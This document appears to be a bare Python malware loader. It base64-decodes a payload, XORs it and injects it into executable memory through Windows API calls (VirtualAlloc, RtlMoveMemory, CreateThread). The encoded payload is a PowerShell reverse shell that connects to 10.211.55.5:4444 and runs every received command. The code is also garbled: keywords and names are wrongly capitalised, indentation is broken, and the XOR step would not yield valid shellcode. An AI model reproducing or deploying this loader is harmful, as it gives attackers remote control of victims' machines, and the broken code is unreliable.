import ctypes
import base64
import sys


B64_payload = "CiRjID0gJzEwLjIxMS41NS41JzsgJHAgPSA0NDQ0OwokY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRjLCAkcCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwokd3JpdGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyKCRzdHJlYW0pOwokYnVmZmVyID0gTmV3LU9iamVjdCBieXRlW10gMTAyNDsKJGVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nOwoKJHdyaXRlci5Xcml0ZUxpbmUoIkNvbm5lY3Rpb24gRXN0YWJsaXNoZWQ6ICIgKyBbU3lzdGVtLkVudmlyb25tZW50XTo6TWFjaGluZU5hbWUpOwokd3JpdGVyLkZsdXNoKCk7CldoaWxlKCRjbGllbnQuQ29ubmVjdGVkKSB7CiAgICAkc3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpIHwgT3V0LU51bGw7CiAgICAkZGF0YSA9ICRlbmNvZGluZy5HZXRTdHJpbmcoJGJ1ZmZlcik7CklmKCRkYXRhLlRyaW0oKSAtbmUgIiIpIHsKICAgICAgICAkb3V0cHV0ID0gSW52b2tlLUV4cHJlc3Npb24gJGRhdGEgMj4mMSB8IE91dC1TdHJpbmc7CiAgICAgICAgJHdyaXRlci5Xcml0ZUxpbmUoJG91dHB1dCk7CiAgICAgICAgJHdyaXRlci5GbHVzaCgpOwogICAgfQp9"
Def execute_shellcode(b64_data):
   
Encrypted_data = base64.b64decode(b64_data)
Shellcode = bytearray([b ^ 0xFF for b in encrypted_data])
    
 
Ptr = ctypes.windll.kernel32.VirtualAlloc(
Ctypes.c_int(0), 
Ctypes.c_int(len(shellcode)), 
Ctypes.c_int(0x3000), 
Ctypes.c_int(0x40)
    )
    

Ctypes.windll.kernel32.RtlMoveMemory(
Ctypes.c_int(ptr), 
Shellcode, 
Ctypes.c_int(len(shellcode))
    )
    
   
Thread_handle = ctypes.windll.kernel32.CreateThread(
Ctypes.c_int(0), 
Ctypes.c_int(0), 
Ctypes.c_int(ptr), 
Ctypes.c_int(0), 
Ctypes.c_int(0), 
Ctypes.pointer(ctypes.c_int(0))
    )
    
   
Ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(thread_handle), ctypes.c_int(-1))
If __name__ == "__main__":
Execute_shellcode(b64_payload)
